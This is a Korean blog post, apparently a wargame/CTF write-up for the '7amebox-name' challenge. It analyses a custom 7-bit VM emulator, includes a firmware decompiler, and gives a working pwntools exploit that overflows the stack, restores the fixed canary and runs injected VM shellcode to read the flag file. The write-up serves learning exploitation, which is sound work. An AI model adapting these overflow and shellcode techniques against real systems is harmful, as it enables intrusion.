---
layout: post
title: "7amebox-name"
comments : true
category : War Game
---

# 문제
***

문제에서 우리에게 주어진 파일은 ___7amebox_patched.py__, __mic_check.firm__, __vm_name.py__, __run.sh__   (__flag__)이다. 

__run.sh__ 는 ```python -u vm_name.py```를 통해서 vm_name.py를 실행하는 역할을 한다.


=> ```python -u```는 stdout과 stderr의 버퍼를 없애는 옵션이다. 

__vm_name.py__ 는 아래와 같이 _7amebox_patched에 정의된 emulator를 이용해서 mic_check.firm을 실행시킨다. (emu.filesystem.load_file('flag') 코드 때문에 exploit.py와 위의 파일들이 같은 디렉토리에 있어야 한다.)

```
...
import _7amebox_patched

firmware = 'mic_check.firm'

emu = _7amebox_patched.EMU()
emu.filesystem.load_file('flag')
emu.register.init_register()
emu.init_pipeline()
emu.load_firmware(firmware)
emu.set_timeout(30)
emu.execute()
```


그래서 _7amebox_patched.py를 분석해봤다.

EMU class는 register와 memory, 입출력 pipeline, 파일 디스크립터(??파일 시스템) 등을 갖는다. (memory는 list형이다.)


load_firmware 메소드는 firmware에 저장되어 있는 데이터를 memory 영역에 쓴다. 이때 memory의 각 요소는 7bits 크기로 구성되어 있다. 즉 해당 에뮬레이터에서 1바이트는 7bits로 이루어져있다. 레지스터는 21비트이다. 

=> push, pop, mov r0, [r1] 등을 할 때 3byte (21bits) 단위로 수행한다.

execute 메소드는 dispatch 메소드를 통해서 decode한 opcode를 실행한다.


dispatch 메소드는 instruction을 decoding하는 역할을 한다. decoding 과정은 다음과 같다.
1. code section에서 2바이트를 읽어온다.
2. 처음 5bits를 이용해서 operator의 종류를 알아낸다.
3. 6번째 있는 bit를 통해서 operand의 개수를 파악한다.
4. 3번의 결과를 이용해서 operand를 계산한다.


이 에뮬레이터는 매우 특이한 엔디안을 사용한다. 
ABC 를 메모리에 저장하면 (낮) C A B (높) 와 같이 저장된다. 


mic_check.firm을 통해서 실행하는 코드를 알아내기 위해서 decompiler를 만들었다. 전체 코드르 알아내기 위해서 decompiler는 execute 메소드를 통해서 실행되는 코드 외에 실행되지 않는 코드까지도 (분기문에서 실행되지 않는 코드) decompile 해야한다. 이를 위해서 mic_check.firm 코드를 처음부터 끝까지 다 읽고 이를 decoding 해야한다.
(op_x0 ~ op_x30에서 수행되는 코드를 지우고 각 메소드에서 수행하는 명령어를 print 함수로 출력하도록 바꿨다.)


**주의해야 할 것**

jmp나 call 등을 수행하는 operator는 call (pc+0x123)와 같이 pc를 기반으로 실행된다. 그런데 이때 pc값은 현재 실행하고 있는 instruction의 주소가 아닌 다음 instruction의 주소를 기반으로 한다.  


Decompile 결과를 요약해보면 다음과 같다.
```
char * ptr1 = "name>";
char * ptr2 = "bye\n";
canary = 0x12345;

write(1,ptr1,strlen(ptr1));
mov [ebp-3], canary;
read(0,ebp-0x3c,0x42);
write(1,ptr2,strlen(ptr2));
canary_check();
pop ebp
ret
```

## exploit 방법

이 문제는 NX가 꺼져 있어서 stack에도 실행 권한이 있다.

1. read함수를 통해서 ebp-3에 canary 값을 넣어주고 sfp, ret를 내가 원하는 값으로 덮어쓴다. (sfp는 0xf5000, ret는 read(0,ebp-0x3c,0x42)의 주소로 덮어쓴다.) 
2. 두 번째로 실행되는 read 함수를 통해서 0xf5000-0x3c에 페이로드를 구성한다. 

payload= "flag\x00"
payload+=flag 파일을 open하고 pipeline에 추가하는 syscall instruction
payload+=pipeline에 추가되어 있는 flag파일 내용을 버퍼에 write하는 syscall instruction
payload+=플래그 값이 write된 버퍼 읽어오는 syscall instruction
payload+="A"*(57-len(payload))
payload+=canary
payload+="AAA"
payload+=0xf5000-0x3c

# 풀이
***

__decompiler.py__
```
#!/usr/hex/python

import random
import signal
import sys

TYPE_R = 0
TYPE_I = 1

def terminate(msg):
    print msg
    exit(-1)

class Register:
    def __init__(self):
        self.register = {}
        self.register_list = ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7', 'r8', 'r9', 'r10', 'bp', 'sp', 'pc',
                              'eflags', 'zero']

    def init_register(self):
        for reg_name in self.register_list:
            self.register[reg_name] = 0

    def get_register(self, reg):
        if isinstance(reg, (int, long)):
            if reg < len(self.register_list):
                reg = self.register_list[reg]
            else:
                terminate("[VM] Invalid register")

        elif reg not in self.register:
            terminate("[VM] Invalid register")

        return reg

class decomp:
    def __init__(self):
        self.dump_file = None
        self.register = Register()
        self.register.init_register()
        self.memory = None
        self.func_list=[]

    def load_file(self, file_name):
        try:
            with open(file_name, 'rb') as f:
                data = f.read()

            self.dump_file = [ord(byte) for byte in data]
            self.memory = [0 for i in range(len(self.dump_file))]

            self.write_memory(self.dump_file, len(self.dump_file))

        except:
            terminate("[VM] Firmware load error")

    def bit_concat(self, bit_list):
        res = 0
        for bit in bit_list:
            res <<= 7
            res += bit & 0b1111111
        return res

    def execute(self):
        pc = 0

        try:
            while 1:
                cur_pc = pc
                op, op_type, opers, op_size = self.dispatch(cur_pc)
                pc = cur_pc + op_size

                if cur_pc in self.func_list:
                    print "sub_" + hex(cur_pc) + ": "

                self.print_decomp_res(pc, cur_pc, op, op_type, opers)

                if self.memory[pc:] == [10, 0]:
                    print "End Decompile"
                    return
        except:
            terminate("[VM] Unknown error")

    def dispatch(self, addr):
        opcode = self.bit_concat(self.read_memory(addr, 2))
        op = (opcode & 0b1111100 0000000) >> 9
        if op >= 31:
            terminate("[VM] Invalid instruction")

        op_type = (opcode & 0b00000100000000) >> 8
        opers = []
        if op_type == TYPE_R:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append((opcode & 0b00000000001111))
            op_size = 2

        elif op_type == TYPE_I:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append(self.read_memory_tri(addr + 2, 1)[0])
            op_size = 5

        else:
            terminate("[VM] Invalid instruction")

        return op, op_type, opers, op_size

    def read_memory(self, addr, length):
        if not length:
            return []

        res = self.memory[addr: addr + length]
        return res

    def read_memory_tri(self, addr, count):
        if not count:
            return []

        res = []
        for i in range(count):
            tri = 0
            tri |= self.memory[addr + i * 3]
            tri |= self.memory[addr + i * 3 + 1] << 14
            tri |= self.memory[addr + i * 3 + 2] << 7
            res.append(tri)
        return res

    def write_memory(self, data, length):
        if not length:
            return

        for offset in range(length):
            self.memory[offset] = data[offset] & 0b1111111

    def print_decomp_res(self, pc, cur_pc, op, op_type, opers):

        if op == 0:
            if op_type == TYPE_R:
                src = self.register.get_register(opers[1])
                dst = self.register.get_register(opers[0])

                print hex(cur_pc) + ":    op_x0    " + "mov " + dst + ", " + "[" + src + "+1] << 14 " + " [ " + src + "+2] << 7 " + "[ " + src + "]"

            else:
                terminate("[VM] Invalid instruction")

 ...

def main():
    decompiler = decomp()
    decompiler.load_file("/home/sungyun/round2/7amebox-name/mic_check.firm")
    decompiler.execute()


if __name__ == '__main__':
    main()

```

__exploit.py__
```
#!/usr/bin/python

from pwn import *

def write_tri(data):

        buf=[0 for i in range(3)]

        buf[0] = chr(data  & 0b000000000000001111111)
        buf[1] = chr((data & 0b111111100000000000000)>>14)
        buf[2] = chr((data & 0b000000011111110000000) >>7)
	return "".join(buf)

def mov_reg_value(dreg,value):
	op=0x12
	opers=0x10*dreg

	return chr(op)+chr(opers)+write_tri(value)

def mov_reg_reg(dreg,sreg):
	op=0x10
	oper=0x10*dreg
	oper+=0x01*sreg

	return chr(op)+chr(oper)

def syscall():
	op=0x20
	oper=0x0
	return chr(op)+chr(oper)

file_path="/home/sungyun/round2/7amebox-name/vm_name.py"

p=process(['python', '-u', file_path])

p.recvuntil("name>")

stack=0xf5000
canary=0x12345
ret=0x2a
buf=stack-0x200

pay="A"*57
pay+=write_tri(canary)
pay+=write_tri(stack)
pay+=write_tri(ret)

p.send(pay)
p.recvuntil("bye\n")

pay2="flag\x00"
pay2+=mov_reg_value(1,stack-60)
pay2+=mov_reg_value(0,1)
pay2+=syscall()

pay2+=mov_reg_value(1,2)
pay2+=mov_reg_value(2,buf)
pay2+=mov_reg_value(3,0x100)
pay2+=mov_reg_value(0,3)
pay2+=syscall()

pay2+=mov_reg_value(1,1)
pay2+=mov_reg_value(0,2)
pay2+=syscall()

pay2+="A"*(57-len(pay2))

pay2+=write_tri(canary)
pay2+="AAA"
pay2+=write_tri(stack-55)

p.send(pay2)
p.recvuntil("bye\n")

print p.recvline()
```

# 알게 된 것
***
1. sys.stdin.readline(size) 는 size만큼 or "\n"까지 입력을 받는다.

2.  ```python -u```는 stdout과 stderr의 버퍼(버퍼링)를 없애는 옵션이다. 

3. pwntools의 process에서 리눅스 명령어를 사용하려면 
```process('echo hello 1>&2', shell=True)```나 ```process(['python','-u','/home/sungyun/round2/7amebox-name/vm_name.py'])```와 같이 사용해야 한다.

4. __special_method__에서 __??__는 스페셜 변수나 메서드에 사용되는 컨벤션이다. __getitem__은 var['key']와 같이 사용했을 때 불리는 메소드이다.

참조 :파이썬 언더스코어(_)에 대하여 <https://mingrammer.com/underscore-in-python/>


